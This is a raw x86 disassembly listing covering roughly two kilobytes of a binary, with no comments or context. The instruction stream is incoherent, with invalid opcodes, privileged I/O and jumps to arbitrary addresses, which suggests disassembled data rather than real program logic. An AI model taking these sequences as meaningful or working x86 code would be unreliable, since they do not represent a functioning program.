  436668:	xlat   BYTE PTR ds:[ebx]
  436669:	out    dx,eax
  43666a:	jp     0x4366ab
  43666c:	xchg   ecx,edi
  43666e:	push   0x62
  436670:	sahf   
  436671:	add    dh,bl
  436673:	repnz rol DWORD PTR [ecx],0xe9
  436677:	jbe    0x436684
  436679:	mov    dl,0xeb
  43667b:	lds    ecx,FWORD PTR [ebp-0x4]
  43667e:	bound  esi,QWORD PTR [edi+ecx*8-0x41549d20]
  436685:	ds push 0xffffffac
  436688:	or     bh,ch
  43668a:	mov    al,ds:0x5ffce15b
  43668f:	sub    ebx,DWORD PTR [edx-0x467f46cb]
  436695:	int    0x92
  436697:	inc    ecx
  436698:	pop    edi
  436699:	jge    0x436624
  43669b:	ins    DWORD PTR es:[edi],dx
  43669c:	pop    ds
  43669d:	shr    dl,0x2f
  4366a0:	inc    ebp
  4366a1:	hlt    
  4366a2:	test   al,0x9
  4366a4:	mov    al,ds:0x52f900b1
  4366a9:	idiv   edi
  4366ab:	pop    es
  4366ac:	inc    edi
  4366ad:	test   DWORD PTR [ecx-0x5d],eax
  4366b0:	scas   al,BYTE PTR es:[edi]
  4366b1:	jmp    0x75ca1a29
  4366b6:	cld    
  4366b7:	mov    WORD PTR [edx],es
  4366b9:	test   BYTE PTR [ebx+edx*4+0x120f0005],bl
  4366c0:	pop    es
  4366c1:	test   DWORD PTR [ebp+0x0],0x0
  4366c8:	mov    eax,0xacd3c61e
  4366cd:	push   ds
  4366ce:	inc    ebp
  4366cf:	fmul   QWORD PTR [esi]
  4366d1:	xchg   BYTE PTR [esi-0x7a32a0f8],bh
  4366d7:	inc    ecx
  4366d8:	push   ebx
  4366d9:	sbb    al,0x4d
  4366db:	clc    
  4366dc:	push   edi
  4366dd:	push   ebp
  4366de:	push   0xffffffd9
  4366e0:	jg     0x436760
  4366e2:	add    ebx,0xffffff9f
  4366e5:	gs ja  0x43666b
  4366e8:	pop    esp
  4366e9:	sahf   
  4366ea:	add    BYTE PTR [ebp+0x20],0xc3
  4366ee:	jecxz  0x4366f7
  4366f0:	mov    ah,0x6c
  4366f2:	idiv   edi
  4366f4:	or     edi,DWORD PTR [ebp+0x1d0c03ba]
  4366fa:	cmp    eax,0xe44ad3f4
  4366ff:	add    BYTE PTR [eax*1-0x1647500],cl
  436706:	cli    
  436707:	(bad)  
  436708:	push   edi
  436709:	dec    ecx
  43670a:	add    edx,DWORD PTR fs:[ebx-0x3437cd1a]
  436711:	xchg   esi,eax
  436713:	add    bl,ah
  436715:	add    al,0x7b
  436717:	jge    0x436719
  436719:	push   es
  43671a:	je     0x436738
  43671c:	inc    edi
  43671d:	dec    ebx
  43671e:	in     al,0xeb
  436720:	iret   
  436721:	add    DWORD PTR [ecx+0x0],0x68392475
  436728:	stos   BYTE PTR es:[edi],al
  436729:	std    
  43672a:	mov    bh,0x62
  43672c:	add    BYTE PTR [eax],al
  43672e:	add    BYTE PTR [eax],al
  436730:	add    ah,ch
  436732:	out    dx,al
  436733:	cmp    BYTE PTR [eax-0x66],dh
  436736:	out    0x1b,eax
  436738:	jge    0x43674a
  43673a:	pop    ds
  43673b:	add    al,0x73
  43673d:	cdq    
  43673e:	and    eax,DWORD PTR [ecx+0x64]
  436741:	jbe    0x4367b3
  436743:	sbb    eax,0xfab33237
  436748:	jge    0x4366da
  43674a:	aaa    
  43674b:	test   eax,0xf10f6f9
  436750:	or     ecx,edi
  436752:	sbb    al,BYTE PTR [edx]
  436754:	add    BYTE PTR [ebp-0x39],dh
  436757:	jle    0x436712
  436759:	lds    ebp,FWORD PTR [ebx-0x3f8a0003]
  43675f:	or     DWORD PTR [ebp-0x75025685],0x8b9f2
  436769:	jne    0x436791
  43676b:	cmp    DWORD PTR [esp+edi*8-0x56],ebp
  43676f:	jl     0x4367b2
  436771:	mov    cl,0x16
  436773:	xchg   ecx,eax
  436774:	lock ja 0x436720
  436777:	std    
  436778:	dec    ebp
  436779:	inc    BYTE PTR [eax+0x75b28b1d]
  43677f:	dec    ebp
  436780:	dec    edi
  436781:	cmp    ch,BYTE PTR [edx-0x56050004]
  436787:	dec    edi
  436788:	mov    edi,DWORD PTR [edx]
  43678a:	cmp    DWORD PTR [esi+eiz*2+0x74],edx
  43678e:	rol    DWORD PTR [edx],0x30
  436791:	jne    0x43673c
  436793:	jle    0x436759
  436795:	add    BYTE PTR [eax],al
  436797:	add    BYTE PTR [eax],al
  436799:	add    BYTE PTR [ebp+0x12],bh
  43679c:	dec    eax
  43679d:	fdivr  st,st(0)
  43679f:	imul   edi,edx,0xaa570882
  4367a5:	stc    
  4367a6:	out    dx,al
  4367a7:	add    bh,BYTE PTR [edx]
  4367a9:	and    dh,ch
  4367ab:	dec    edi
  4367ac:	or     edi,DWORD PTR [ebp+0x44]
  4367af:	xor    ah,BYTE PTR [esi+edx*4-0x5b]
  4367b3:	add    al,0xe7
  4367b5:	add    esi,DWORD PTR [ebx]
  4367b7:	lea    ebp,[edx]
  4367b9:	dec    esp
  4367ba:	inc    ebp
  4367bb:	xor    DWORD PTR [esi+0x3e],ebp
  4367be:	adc    eax,0x7505e7c7
  4367c3:	add    ah,bh
  4367c5:	jp     0x4367fb
  4367c7:	es mov bh,0x80
  4367ca:	and    DWORD PTR [edi-0x29],ecx
  4367cd:	push   ecx
  4367ce:	fild   DWORD PTR [edi+edi*1]
  4367d1:	mov    edx,0x82e7029c
  4367d6:	cmp    edx,edi
  4367d8:	outs   dx,DWORD PTR ds:[esi]
  4367d9:	dec    eax
  4367da:	cmp    eax,0xf7fe2785
  4367df:	std    
  4367e0:	cmp    ebp,DWORD PTR [esi-0x537cb4]
  4367e6:	je     0x436773
  4367e8:	mov    esp,0xf60734ab
  4367ed:	add    esi,DWORD PTR [ebp+0x2]
  4367f0:	loop   0x436779
  4367f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4367f3:	or     bh,ah
  4367f5:	add    esi,DWORD PTR [edi+eax*1]
  4367f8:	fild   DWORD PTR [ebx]
  4367fa:	jne    0x4367fe
  4367fc:	data16 xor BYTE PTR [eax],al
  4367ff:	add    BYTE PTR [eax],al
  436801:	add    BYTE PTR [eax],al
  436803:	adc    DWORD PTR [eax],ecx
  436805:	jne    0x436824
  436807:	mov    bl,BYTE PTR ds:0x9f0200f7
  43680d:	out    0x31,eax
  43680f:	xchg   esi,eax
  436810:	mov    esp,DWORD PTR [esp+edi*8]
  436813:	stc    
  436814:	dec    esp
  436815:	mov    edi,0x60924679
  43681a:	cmp    al,0x71
  43681c:	mov    esi,DWORD PTR [esp+ebp*4]
  43681f:	repnz or DWORD PTR [esi+0x3f],ebp
  436823:	aad    0x88
  436825:	add    BYTE PTR [ecx],bl
  436827:	popa   
  436828:	test   DWORD PTR [ebx-0x53],edx
  43682b:	xchg   DWORD PTR es:[eax-0x13],edx
  43682f:	xchg   DWORD PTR es:[ecx-0x1f],ebx
  436833:	das    
  436834:	adc    DWORD PTR [ecx+eax*4],edi
  436837:	call   0x1e2c6825
  43683c:	inc    ebx
  43683d:	or     BYTE PTR [edx+0x41],dh
  436840:	push   cs
  436841:	test   DWORD PTR [ecx],esi
  436843:	imul   eax,DWORD PTR [ebp+0x110db159],0xaa2a603c
  43684d:	test   ecx,edi
  43684f:	std    
  436850:	inc    ecx
  436851:	add    al,0x6a
  436853:	cmp    eax,0x6c167d0b
  436858:	test   DWORD PTR [ebx+0x59],ecx
  43685b:	fidiv  WORD PTR [ecx]
  43685d:	clc    
  43685e:	jo     0x436812
  436860:	sahf   
  436861:	or     DWORD PTR [ebp+edx*8+0x1],esp
  436865:	add    cl,ch
  436867:	add    BYTE PTR [eax],al
  436869:	add    BYTE PTR [eax],al
  43686b:	add    BYTE PTR [ecx],dh
  43686d:	test   ah,al
  43686f:	shl    BYTE PTR [esi+0x2],cl
  436872:	stc    
  436873:	or     BYTE PTR es:[edi+eiz*8+0x27a7c],bl
  43687b:	bound  ebp,QWORD PTR [eax+0x36]
  43687e:	mov    eax,0x276e8
  436883:	sbb    dl,cl
  436885:	ret    
  436886:	and    DWORD PTR ds:0xe900027c,0xa1000276
  436890:	adc    eax,0x7db1855f
  436895:	inc    ebx
  436896:	dec    esp
  436897:	jb     0x436913
  436899:	mov    al,BYTE PTR [ebp+0x8a5b7a1]
  43689f:	fisubr WORD PTR [eax-0x3b]
  4368a2:	xchg   DWORD PTR [eax],eax
  4368a4:	mov    DWORD PTR [edx+0x33],ebx
  4368a7:	into   
  4368a8:	mov    al,BYTE PTR [ecx-0x7d]
  4368ab:	call   FWORD PTR [edi-0x14]
  4368ae:	sti    
  4368af:	add    BYTE PTR [ebx-0x33fa467b],ah
  4368b5:	add    DWORD PTR [edi],eax
  4368b7:	mov    dh,0x9e
  4368b9:	outs   dx,BYTE PTR ds:[esi]
  4368ba:	inc    ebp
  4368bb:	cld    
  4368bc:	pop    ss
  4368bd:	pop    edi
  4368be:	retf   
  4368bf:	loopne 0x4368d8
  4368c1:	ficom  WORD PTR [ebx+0x42]
  4368c4:	cmpxchg8b QWORD PTR [eax]
  4368c7:	add    edx,esp
  4368c9:	sub    ecx,edi
  4368cb:	call   FWORD PTR [ecx+eax*1+0xe0cb]
  4368d2:	add    BYTE PTR [eax],al
  4368d4:	add    BYTE PTR [edi],dl
  4368d6:	fimul  WORD PTR [ebx-0x77]
  4368d9:	mov    ecx,0x9f234869
  4368de:	sbb    al,BYTE PTR [ecx+eax*4]
  4368e1:	xlat   BYTE PTR ds:[ebx]
  4368e2:	pop    ecx
  4368e3:	mov    ecx,0xaf9e54e9
  4368e8:	leave  
  4368e9:	in     eax,0x44
  4368eb:	hlt    
  4368ec:	cmp    esp,DWORD PTR [edx-0x637b472a]
  4368f2:	sahf   
  4368f3:	jge    0x4368b5
  4368f5:	dec    esp
  4368f6:	add    DWORD PTR [eax],eax
  4368f8:	test   al,0x5c
  4368fa:	sahf   
  4368fb:	jle    0x4368b5
  4368fd:	sbb    al,0x1
  4368ff:	add    BYTE PTR [ebx+0x8e1c054],cl
  436905:	xchg   ebp,eax
  436906:	(bad)  
  436908:	cvtps2pd xmm3,QWORD PTR [eax-0x7f]
  43690c:	dec    ebp
  43690d:	js     0x4368ad
  43690f:	scas   eax,DWORD PTR es:[edi]
  436910:	enter  0xdc1f,0xe3
  436914:	mov    ecx,ebx
  436916:	int3   
  436917:	mov    eax,0x10c01
  43691c:	sar    DWORD PTR [esp+ebx*1-0x1c8a1bbb],cl
  436923:	loopne 0x4368e1
  436925:	mov    dl,0x79
  436928:	dec    ebx
  436929:	loope  0x436994
  43692b:	fwait
  43692c:	adc    BYTE PTR [esi+0x6a],dh
  43692f:	jns    0x4368f9
  436931:	(bad)  
  436932:	jmp    0x43696b
  436934:	test   DWORD PTR [ecx+0x23],edi
  436937:	cmc    
  436938:	mov    cl,0x0
  43693a:	add    BYTE PTR [eax],al
  43693c:	add    BYTE PTR [eax],al
  43693e:	sub    BYTE PTR [edi+0x7b],bl
  436941:	inc    ebx
  436942:	test   eax,0x7a089c69
  436947:	cmp    eax,0xafb5fdc4
  43694c:	mov    edi,0xfe703b72
  436951:	mov    ch,dh
  436953:	stos   BYTE PTR es:[edi],al
  436954:	std    
  436955:	push   DWORD PTR [ebp+0x28]
  436958:	daa    
  436959:	cld    
  43695a:	jne    0x436918
  43695c:	jns    0x43697d
  43695e:	jo     0x43690b
  436960:	std    
  436961:	or     BYTE PTR [ebx],ch
  436963:	test   al,0x7a
  436965:	retf   0x4a46
  436968:	jns    0x4369b5
  43696a:	inc    ecx
  43696b:	dec    ebp
  43696c:	aaa    
  43696d:	cld    
  43696e:	mov    bh,0xa8
  436970:	lds    ecx,FWORD PTR [ecx]
  436972:	or     esp,edi
  436974:	jp     0x4369b9
  436976:	push   ecx
  436977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436978:	outs   dx,DWORD PTR ds:[esi]
  436979:	(bad)  
  43697a:	jbe    0x43695d
  43697c:	imul   edi,edi,0x3a
  43697f:	stos   BYTE PTR es:[edi],al
  436980:	std    
  436981:	int3   
  436982:	adc    eax,0xf6e43711
  436987:	jmp    0x436984
  436989:	xchg   al,cl
  43698b:	icebp  
  43698c:	cmp    ebx,DWORD PTR ds:0x99bf936
  436992:	retf   0xc76e
  436995:	std    
  436996:	xor    eax,0xee4c3521
  43699b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43699c:	test   BYTE PTR [edi-0x3b24fd50],al
  4369a2:	add    BYTE PTR [eax],al
  4369a4:	add    BYTE PTR [eax],al
  4369a6:	add    ch,bl
  4369a8:	or     ch,dl
  4369aa:	jno    0x436961
  4369ac:	jmp    FWORD PTR [ebx]
  4369ae:	mov    al,ds:0x5e52c4a8
  4369b3:	ins    BYTE PTR es:[edi],dx
  4369b4:	push   esp
  4369b5:	xor    al,0xc9
  4369b7:	clc    
  4369b8:	inc    ebp
  4369b9:	mov    bl,0xd6
  4369bb:	shl    bh,1
  4369bd:	mov    bh,0x7c
  4369bf:	in     al,dx
  4369c0:	(bad)  
  4369c1:	into   
  4369c2:	add    esi,DWORD PTR [ebp-0x79]
  4369c5:	scas   eax,DWORD PTR es:[edi]
  4369c6:	les    ebx,FWORD PTR [edx-0x4d8e15f6]
  4369cc:	add    DWORD PTR [edx-0x41],esp
  4369cf:	mov    BYTE PTR [edx],al
  4369d1:	out    0xd6,eax
  4369d3:	nop
  4369d4:	out    0x77,eax
  4369d6:	jl     0x436a16
  4369d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4369d9:	outs   dx,BYTE PTR ds:[esi]
  4369da:	mov    ebx,0x7cd7a9ca
  4369df:	sub    al,0x42
  4369e1:	arpl   bx,ax
  4369e3:	push   es
  4369e4:	pop    es
  4369e5:	sub    al,BYTE PTR [edx]
  4369e7:	mov    al,BYTE PTR [edx]
  4369e9:	out    0x3,eax
  4369eb:	push   edx
  4369ec:	fsubr  st,st(2)
  4369ee:	add    esi,DWORD PTR [ebp+0x6a]
  4369f1:	pop    es
  4369f2:	xor    BYTE PTR [esi+0x68bf6ac3],al
  4369f8:	add    ah,bh
  4369fa:	stos   BYTE PTR es:[edi],al
  4369fb:	dec    esp
  4369fc:	fwait
  4369fd:	xor    al,dl
  4369ff:	je     0x436a08
  436a01:	out    0x3,eax
  436a03:	jne    0x4369ae
  436a05:	enter  0x32ff,0x9b
  436a09:	dec    edi
  436a0a:	inc    ebx
  436a0b:	add    BYTE PTR [eax],al
  436a0d:	add    BYTE PTR [eax],al
  436a0f:	add    BYTE PTR [ecx+0x6d405e0b],ah
  436a15:	ret    
  436a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436a17:	or     edx,ebp
  436a19:	push   cs
  436a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436a1b:	add    ebx,DWORD PTR [edx]
  436a1d:	or     ah,bl
  436a1f:	add    esi,DWORD PTR [ebp+0xb]
  436a22:	add    BYTE PTR [edi],bh
  436a24:	mov    esi,0x79dedf1c
  436a29:	dec    ecx
  436a2a:	dec    eax
  436a2b:	scas   al,BYTE PTR es:[edi]
  436a2c:	je     0x436a1d
  436a2e:	(bad)  
  436a2f:	call   0x2184efaa
  436a34:	(bad)
  436a39:	stos   BYTE PTR es:[edi],al
  436a3a:	ins    DWORD PTR es:[edi],dx
  436a3b:	adc    BYTE PTR [edx+0x66],cl
  436a3e:	and    al,0xe9
  436a40:	jbe    0x436a44
  436a42:	add    BYTE PTR [edx-0x66],ch
  436a45:	sahf   
  436a46:	add    dh,bl
  436a48:	cmp    bl,bl
  436a4a:	add    ebp,ecx
  436a4c:	jbe    0x436a57
  436a4e:	mov    dl,0xeb
  436a50:	fld    QWORD PTR [esi-0x4]
  436a53:	(bad)  
  436a54:	(bad)  
  436a56:	loopne 0x436a83
  436a58:	lock mov edi,0x9a427008
  436a5e:	std    
  436a5f:	mov    al,ds:0xfb481198
  436a64:	lods   al,BYTE PTR ds:[esi]
  436a65:	test   BYTE PTR [ecx+0x21],cl
  436a68:	or     DWORD PTR [ebx-0x38891607],ebx
  436a6e:	loopne 0x436a82
  436a70:	es dec ebx
  436a72:	sbb    eax,0x2a
  436a77:	add    BYTE PTR [eax],al
  436a79:	jbe    0x436abe
  436a7b:	inc    eax
  436a7c:	cmp    bh,al
  436a7e:	cdq    
  436a7f:	mov    ch,BYTE PTR ds:0x72000280
  436a85:	mov    WORD PTR [edx-0x79],es
  436a88:	add    ax,si
  436a8b:	(bad)  
  436a8c:	call   0xe9556ec6
  436a91:	jbe    0x436a95
  436a93:	test   DWORD PTR [esi-0x1700a542],ebp
  436a99:	jbe    0x436a9d
  436a9b:	int    0x9
  436a9d:	pop    ecx
  436a9e:	idiv   DWORD PTR [eax+eax*1+0x47835687]
  436aa5:	in     al,dx
  436aa6:	push   ss
  436aa7:	add    al,0x88
  436aa9:	xchg   edi,eax
  436aaa:	push   esi
  436aab:	mov    ecx,0xaf9b14e9
  436ab0:	leave  
  436ab1:	gs fdiv st,st(3)
  436ab4:	cmp    ebx,DWORD PTR [edx]
  436ab6:	aam    0x3f
  436ab8:	nop
  436ab9:	dec    edi
  436aba:	loopne 0x436ab7
  436abc:	add    BYTE PTR [ebx-0x23fc36e7],bh
  436ac2:	add    eax,0x6adeb607
  436ac7:	inc    ebp
  436ac8:	cld    
  436ac9:	push   edi
  436aca:	pop    ebx
  436acb:	retf   
  436acc:	loopne 0x436b25
  436ace:	ficom  DWORD PTR [edi+0x42]
  436ad1:	pop    ds
  436ad2:	ret    
  436ad3:	or     BYTE PTR [ebx],al
  436ad5:	mov    ah,0x2d
  436ad7:	stc    
  436ad8:	dec    DWORD PTR [ebp+eax*1+0xe0cb]
  436adf:	add    BYTE PTR [eax],al
  436ae1:	add    BYTE PTR [edi],dl
  436ae3:	fimul  DWORD PTR [edi-0x77]
  436ae6:	jno    0x436b4e
  436ae8:	dec    eax
  436ae9:	and    ebx,edi
  436aeb:	push   ss
  436aec:	add    al,0x81
  436aee:	pop    ss
  436aef:	pop    ebp
  436af0:	mov    ecx,0xaf9a94e9
  436af5:	leave  
  436af6:	in     eax,0xd8
  436af8:	repz cmp ebx,DWORD PTR [edx-0x4357472e]
  436aff:	call   0x8b00:0x54cb07e
  436b06:	test   ah,al
  436b08:	loope  0x436b12
  436b0a:	(bad)
  436b0d:	cmpps  xmm3,XMMWORD PTR [ecx+eax*4+0x4d],0xb0
  436b13:	call   0x89e3:0xd01fc8af
  436b1a:	rol    eax,1
  436b1c:	mov    eax,0xfdab7501
  436b21:	inc    DWORD PTR [esi+0xb]
  436b24:	jl     0x436b71
  436b26:	sbb    DWORD PTR [ebx-0x1c],edx
  436b29:	mov    esp,0x4b7bf326
  436b2e:	or     edx,ebp
  436b30:	xchg   ebp,eax
  436b31:	adc    BYTE PTR [esi-0x16],dh
  436b34:	jnp    0x436afe
  436b36:	(bad)  
  436b37:	out    0x53,eax
  436b39:	test   DWORD PTR [ecx+0x13],esi
  436b3c:	icebp  
  436b3d:	mov    cl,0x30
  436b3f:	push   edi
  436b40:	jnp    0x436b85
  436b42:	loope  0x436bad
  436b44:	pushf  
  436b45:	or     BYTE PTR [eax],al
  436b47:	add    BYTE PTR [eax],al
  436b49:	add    BYTE PTR [eax],al
  436b4b:	sbb    BYTE PTR [ecx],0xc4
  436b4e:	std    
  436b4f:	mov    ch,0x3
  436b51:	mov    edx,0x272c2b72
  436b56:	cld    
  436b57:	jne    0x436b11
  436b59:	jns    0x436b9a
  436b5b:	jbe    0x436b08
  436b5d:	std    
  436b5e:	or     bl,ah
  436b60:	lods   al,BYTE PTR ds:[esi]
  436b61:	jbe    0x436b2d
  436b63:	(bad)  
  436b64:	mov    dh,BYTE PTR [ebp+0x4b]
  436b67:	mov    ecx,0x37fc3787
  436b6c:	lods   al,BYTE PTR ds:[esi]
  436b6d:	lds    ecx,FWORD PTR [ecx]
  436b6f:	ret    
  436b70:	pop    ebp
  436b71:	jnp    0x436bb6
  436b73:	cdq    
  436b74:	lahf   
  436b75:	imul   eax,edi,0x76
  436b78:	arpl   WORD PTR [edi+edi*8+0x72],bp
  436b7c:	stos   BYTE PTR es:[edi],al
  436b7d:	std    
  436b7e:	int3   
  436b7f:	push   ebp
  436b80:	adc    eax,0xe7f6e437
  436b85:	sti    
  436b86:	xchg   al,al
  436b88:	xor    DWORD PTR [ebx*1+0x99bfd36],edi
  436b8f:	add    ah,BYTE PTR [edi-0x3d]
  436b92:	std    
  436b93:	xor    eax,0xee503125
  436b98:	popf   
  436b99:	test   BYTE PTR [edi-0x3ae4fd48],al
  436b9f:	sbb    eax,0x356dea0b
  436ba4:	add    al,0xac
  436ba6:	lahf   
  436ba7:	pusha  
  436ba8:	rcl    BYTE PTR [edx-0x4baf83a7],0xc8
  436baf:	add    BYTE PTR [eax],al
  436bb1:	add    BYTE PTR [eax],al
  436bb3:	add    al,dh
  436bb5:	cmp    eax,0xec18d2f3
  436bba:	test   DWORD PTR [esp+ebp*8],0x7503cebe
  436bc1:	mov    ebp,DWORD PTR [edi-0x15f52d3c]
  436bc7:	ins    DWORD PTR es:[edi],dx
  436bc8:	mov    edx,0x80bf6201
  436bcd:	add    ah,bh
  436bcf:	rcr    al,cl
  436bd1:	jmp    0x436b8a
  436bd3:	jl     0x436c13
  436bd5:	sahf   
  436bd6:	pop    DWORD PTR [ebx+0x49]
  436bd9:	pop    es
  436bda:	pop    esi
  436bdb:	inc    eax
  436bdc:	ins    DWORD PTR es:[edi],dx
  436bdd:	mov    edi,0x13d50c27
  436be2:	daa    
  436be3:	add    al,0x92
  436be5:	cmp    ah,ch
  436be7:	add    esi,DWORD PTR [ebp-0x75]
  436bea:	lahf   
  436beb:	mul    ah
  436bed:	ret    0x9ca8
  436bf0:	add    DWORD PTR gs:[edi+0x2347f3f6],0x7d
  436bf8:	xor    al,0x4a
  436bfa:	stos   BYTE PTR es:[edi],al
  436bfb:	(bad)  
  436bfc:	gs add ah,bh
  436bff:	add    edi,eax
  436c01:	ds scas eax,DWORD PTR es:[edi]
  436c03:	xor    BYTE PTR ds:0x52eaa70e,0x13
  436c0a:	add    eax,0xe796de83
  436c0f:	div    dh
  436c11:	jno    0x436bf8
  436c13:	add    esi,DWORD PTR [ebp+0x7]
  436c16:	jno    0x436c19
  436c18:	add    BYTE PTR [eax],al
  436c1a:	add    BYTE PTR [eax],al
  436c1c:	add    BYTE PTR [eax*2-0x3340cb00],bh
  436c23:	int    0x49
  436c25:	mov    ah,0x15
  436c27:	ret    0xa9f1
  436c2a:	xor    edi,eax
  436c2c:	jmp    0xbc64:0xa170cd2e
  436c33:	test   DWORD PTR [esi-0x1700a5b2],ebx
  436c39:	jbe    0x436c3d
  436c3b:	int    0x9
  436c3d:	pop    ds
  436c3e:	test   al,0x48
  436c40:	retf   0x9737
  436c43:	inc    edx
  436c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436c45:	(bad)  
  436c46:	pushf  
  436c47:	push   DWORD PTR [ebp-0x4b]
  436c4a:	in     al,dx
  436c4b:	(bad)  
  436c4c:	call   0xe95b6d72
  436c51:	jbe    0x436c55
  436c53:	jge    0x436ca1
  436c55:	or     DWORD PTR [edx],eax
  436c57:	or     DWORD PTR [ebp-0x7d],ebp
  436c5a:	cwde   
  436c5b:	stc    
  436c5c:	jmp    0x323b79e
  436c61:	adc    BYTE PTR [edx-0x32cad97b],0xbe
  436c68:	pop    ds
  436c69:	outs   dx,BYTE PTR ds:[esi]
  436c6a:	fnstsw WORD PTR [esi+0x358e6270]
  436c70:	cs mov ebp,0x186a0b10
  436c76:	ret    0xe915
  436c79:	jbe    0x436c7d
  436c7b:	or     DWORD PTR [ebp+ecx*1-0x69],esp
  436c7f:	stc    
  436c80:	jmp    0x436c85
  436c85:	add    ch,bh
  436c87:	dec    eax
  436c88:	xor    BYTE PTR [edx+0x12091137],dh
  436c8e:	or     BYTE PTR ss:[ecx+0x15],0x74
  436c93:	dec    ebx
  436c94:	sub    BYTE PTR [eax-0x66],ah
  436c97:	mov    fs,WORD PTR ds:0x84ffec21
  436c9d:	add    BYTE PTR [ebx],al
  436c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436ca0:	and    al,0xc8
  436ca2:	dec    edi
  436ca3:	iret   
  436ca4:	das    
  436ca5:	mov    ecx,DWORD PTR [ecx]
  436ca7:	or     WORD PTR [ebp-0x78],0x471b
  436cad:	inc    eax
  436cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436caf:	int    0xdb
  436cb1:	cmp    ecx,DWORD PTR [ebp-0x1c]
  436cb4:	or     al,0x8b
  436cb6:	dec    ebp
  436cb7:	jnp    0x436cbf
  436cb9:	mov    esi,ecx
  436cbb:	jns    0x436ce0
  436cbd:	enter  0xd787,0x3f
  436cc1:	mov    ecx,edx
  436cc3:	lds    eax,FWORD PTR [ecx+0x3d196045]
  436cc9:	hlt    
  436cca:	push   edi
  436ccb:	int    0xef
  436ccd:	cmp    ebx,DWORD PTR ds:0xd8afce8
  436cd3:	sbb    DWORD PTR ds:0x815677f4,edi
  436cd9:	dec    ebp
  436cda:	lods   al,BYTE PTR ds:[esi]
  436cdb:	sbb    al,BYTE PTR [ebp-0x24]
  436cde:	addr16 push esi
  436ce0:	add    DWORD PTR [ebp-0x5c],0x18
  436ce4:	inc    edi
  436ce5:	inc    eax
  436ce6:	push   edi
  436ce7:	int3   
  436ce8:	shr    DWORD PTR [ebx],cl
  436cea:	add    BYTE PTR [eax],al
  436cec:	add    BYTE PTR [eax],al
  436cee:	add    BYTE PTR [ecx-0x17b27e8a],dl
  436cf4:	jp     0x436cfe
  436cf6:	jmp    0x436c87
  436cf8:	or     al,0x41
  436cfa:	add    BYTE PTR [edi],dl
  436cfc:	int3   
  436cfd:	ror    DWORD PTR [edx+0x458300b0],cl
  436d03:	in     al,0x19
  436d05:	or     BYTE PTR [eax+0x3],al
  436d08:	int3   
  436d09:	xrelease mov DWORD PTR [ecx+0x76],ecx
  436d0d:	ins    DWORD PTR es:[edi],dx
  436d0e:	in     al,dx
  436d0f:	(bad)  
  436d11:	aas    
  436d12:	add    BYTE PTR [ebx+0x14],ah
  436d15:	aaa    
  436d16:	add    DWORD PTR [ecx+eax*1-0x41],ecx
  436d1a:	pop    es
  436d1b:	jne    0x436cb4
  436d1d:	std    
  436d1e:	push   DWORD PTR [ebp+0x42]
  436d21:	jmp    0x80eeb824
  436d26:	jnp    0x436d6d
  436d28:	stos   DWORD PTR es:[edi],eax
  436d29:	hlt    
  436d2a:	sub    ebp,0xffffffa9
  436d2d:	std    
  436d2e:	(bad)  
  436d2f:	(bad)  
  436d30:	pop    ebp
  436d31:	xchg   ebp,eax
  436d32:	xchg   BYTE PTR [edx-0x4af78a95],bh
  436d38:	hlt    
  436d39:	xor    eax,esi
  436d3b:	in     al,dx
  436d3c:	gs xchg ebp,eax
  436d3e:	sar    DWORD PTR [edx-0x71],0xfd
  436d42:	push   DWORD PTR [ebp-0xe]
  436d45:	or     al,0xff
  436d47:	add    ch,BYTE PTR [ebx-0x54928680]
  436d4d:	hlt    
  436d4e:	and    DWORD PTR ds:0xfffdab,0x0
  436d55:	add    BYTE PTR [eax],al
  436d57:	add    dh,dh
  436d59:	pushf  
  436d5a:	in     al,0x6c
  436d5c:	fwait
  436d5d:	sub    BYTE PTR es:[esi*2+0x75fc1f28],ah
  436d65:	mov    ah,0x81
  436d67:	dec    edi
  436d68:	je     0x436d15
  436d6a:	std    
  436d6b:	or     BYTE PTR [ebx],cl
  436d6d:	test   eax,0x1fb94b9e
  436d72:	into   
  436d73:	int    0x95
  436d75:	call   0x12c12ffa
  436d7a:	aaa    
  436d7b:	clc    
  436d7c:	jbe    0x436d41
  436d7e:	cmp    edx,0x85bdf955
  436d84:	cmp    BYTE PTR [ebx+0xf8542e9],cl
  436d8a:	dec    edi
  436d8b:	or     BYTE PTR [edx+ebp*8-0x9],dh
  436d8f:	(bad)  
  436d90:	xor    ebp,DWORD PTR [edi+0x1f55438c]
  436d96:	les    esi,FWORD PTR [esp+ebx*4+0x2]
  436d9a:	outs   dx,BYTE PTR ds:[esi]
  436d9b:	push   ecx
  436d9c:	dec    ebp
  436d9d:	mov    BYTE PTR [edx+0x1ee7aafb],dh
  436da3:	xchg   esp,ecx
  436da5:	repnz out 0x34,al
  436da8:	mov    ebx,0x33abea0e
  436dad:	std    
  436dae:	out    0x3,al
  436db0:	push   eax
  436db1:	(bad)  
  436db2:	ds pop edi
  436db4:	pop    DWORD PTR [edx]
  436db6:	out    0x8e,eax
  436db8:	mov    esi,0x396e0a
  436dbd:	add    BYTE PTR [eax],al
  436dbf:	add    BYTE PTR [eax],al
  436dc1:	sbb    eax,0xf3fba28a
  436dc6:	inc    ecx
  436dc7:	xlat   BYTE PTR ds:[ebx]
  436dc8:	xchg   BYTE PTR [edx+esi*8-0x6d49711a],cl
  436dcf:	jo     0x436e1a
  436dd1:	adc    eax,0x58192688
  436dd6:	fucom  st(6)
  436dd8:	mov    ds:0xcf5e0275,al
  436ddd:	sub    ah,BYTE PTR [edx-0x77ddf909]
  436de3:	scas   al,BYTE PTR es:[edi]
  436de4:	(bad)  
  436de5:	ror    BYTE PTR [edx],cl
  436de7:	push   0xe79375a4
  436dec:	add    ecx,DWORD PTR [edx]
  436dee:	mov    ds:0x880206ef,eax
  436df3:	scas   al,BYTE PTR es:[edi]
  436df4:	(bad)  
  436df5:	sar    dl,cl
  436df7:	in     eax,0xc4
  436df9:	push   0x7917cf3b
  436dfe:	xchg   DWORD PTR [esp+ecx*1],ebp
  436e01:	mov    ah,0x42
  436e03:	jmp    DWORD PTR [ebx+0x8]
  436e06:	inc    edx
  436e07:	out    0xae,eax
